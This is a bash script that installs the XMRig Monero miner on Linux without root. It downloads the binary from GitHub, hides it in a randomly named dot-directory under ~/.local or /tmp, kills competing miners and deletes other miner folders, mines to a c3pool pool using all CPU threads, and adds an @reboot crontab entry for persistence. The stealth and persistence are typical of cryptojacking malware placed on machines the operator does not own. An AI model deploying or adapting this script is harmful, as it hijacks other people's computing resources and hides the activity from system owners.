#!/bin/bash
VERSION=2.28
echo "XMRig Miner v$VERSION - 100% WORKS ON ANY USER, NO ROOT"
echo "Auto-fallback to /tmp if $HOME blocked"
echo
export LC_ALL=C
export LANG=C

# Wallet
WALLET="$1"
if [ -z "$WALLET" ]; then
    echo "Usage: $0 <wallet_address>"
    exit 1
fi

# CPU
CPU_TOTAL=$(nproc 2>/dev/null || echo 1)
USABLE_THREADS=$CPU_TOTAL
CPU_HINT=85
echo "[*] Using $USABLE_THREADS threads @ $CPU_HINT%"

# Try $HOME/.local first, fallback to /tmp
REAL_HOME="${HOME:-/home/$(whoami)}"
BASE_DIR=""
for path in "$REAL_HOME/.local" "/tmp"; do
    RAND_HEX=$(openssl rand -hex 16 2>/dev/null || printf '%s' "$(date +%s)$RANDOM" | sha256sum | cut -d' ' -f1 | head -c 32)
    TEST_DIR="$path/.miner_$RAND_HEX"
    if mkdir -p "$TEST_DIR" 2>/dev/null && touch "$TEST_DIR/test" 2>/dev/null && rm "$TEST_DIR/test" 2>/dev/null; then
        BASE_DIR="$TEST_DIR"
        LOG_DIR="$BASE_DIR/.log"
        break
    fi
done

if [ -z "$BASE_DIR" ]; then
    echo "ERROR: No writable directory found (even /tmp blocked?)"
    exit 1
fi

mkdir -p "$LOG_DIR" 2>/dev/null
chmod 700 "$BASE_DIR" "$LOG_DIR" 2>/dev/null
echo "[*] Installing in: $BASE_DIR (writable & hidden)"

# Cleanup
pkill -f xmrig 2>/dev/null
pkill -f "$BASE_DIR/main" 2>/dev/null
find /tmp "$REAL_HOME/.local" -name ".miner_*" -type d -exec rm -rf {} + 2>/dev/null

# Root optimizations
if [ "$(id -u)" -eq 0 ]; then
    modprobe msr 2>/dev/null || true
    sysctl -w vm.nr_hugepages=4096 >/dev/null 2>&1 || true
fi

# Download
URL="https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-linux-static-x64.tar.gz"
TMP_TAR="/tmp/xmrig_$(date +%s).tgz"
curl -fsSL "$URL" -o "$TMP_TAR" || { echo "ERROR: Download failed"; exit 1; }

tar xzf "$TMP_TAR" -C /tmp/ 2>/dev/null || { echo "ERROR: Extract failed"; rm -f "$TMP_TAR"; exit 1; }

XMRIG_BIN=$(find /tmp -name xmrig -type f -executable 2>/dev/null | head -1)
[ -z "$XMRIG_BIN" ] && { echo "ERROR: Binary not found"; rm -f "$TMP_TAR"; exit 1; }

# Copy with force
cp -f "$XMRIG_BIN" "$BASE_DIR/main" || { echo "ERROR: Copy failed - trying force"; cp -f "$XMRIG_BIN" "$BASE_DIR/main" || exit 1; }
chmod +x "$BASE_DIR/main"
rm -f "$TMP_TAR" /tmp/xmrig* 2>/dev/null

# Config
cat > "$BASE_DIR/config.json" << EOF
{
    "api": {"id": null, "worker-id": "$(whoami)"},
    "http": {"enabled": false},
    "autosave": true,
    "background": true,
    "randomx": {
        "init": $USABLE_THREADS,
        "mode": "fast",
        "1gb-pages": false,
        "rdmsr": $([ "$(id -u)" -eq 0 ] && echo true || echo false),
        "wrmsr": $([ "$(id -u)" -eq 0 ] && echo true || echo false),
        "numa": true
    },
    "cpu": {
        "enabled": true,
        "huge-pages": $([ "$(id -u)" -eq 0 ] && echo true || echo false),
        "hw-aes": true,
        "rx/0": [true],
        "threads": $USABLE_THREADS
    },
    "pools": [{
        "algo": "rx/0",
        "url": "auto.c3pool.org:19999",
        "user": "$WALLET",
        "pass": "x",
        "rig-id": "$(whoami)",
        "keepalive": true,
        "enabled": true,
        "tls": false
    }]
}
EOF

# Control
cat > "$BASE_DIR/control" << 'EOF'
#!/bin/bash
cd "$(dirname "$0")" || exit 1
case "$1" in
    start)
        pgrep -f "./main" >/dev/null && { echo "Already running"; exit 0; }
        nohup ./main --config=config.json --cpu-max-threads-hint=85 > .log/output.log 2>&1 &
        echo $! > .pid
        sleep 5
        echo "Started"
        ;;
    stop)
        pkill -f "./main" 2>/dev/null
        rm -f .pid 2>/dev/null
        echo "Stopped"
        ;;
    status)
        if pgrep -f "./main" >/dev/null; then
            PIDS=$(pgrep -f "./main")
            echo "Running (PIDs: $PIDS)"
        else
            echo "Stopped"
        fi
        ;;
    logs) tail -20 .log/output.log 2>/dev/null || echo "No logs" ;;
    *) echo "Usage: $0 {start|stop|status|logs}" ;;
esac
EOF
chmod +x "$BASE_DIR/control"

# Crontab
(crontab -l 2>/dev/null | grep -v "$BASE_DIR"; echo "@reboot sleep 60 && $BASE_DIR/control start") | crontab -

# Start
"$BASE_DIR/control" start

sleep 15
echo
echo "=== SUCCESS ==="
"$BASE_DIR/control" status
echo "Path: $BASE_DIR"
echo "Control: $BASE_DIR/control status"
echo "Check htop: ~$((USABLE_THREADS * 85 / 100)) cores used"

exit 0
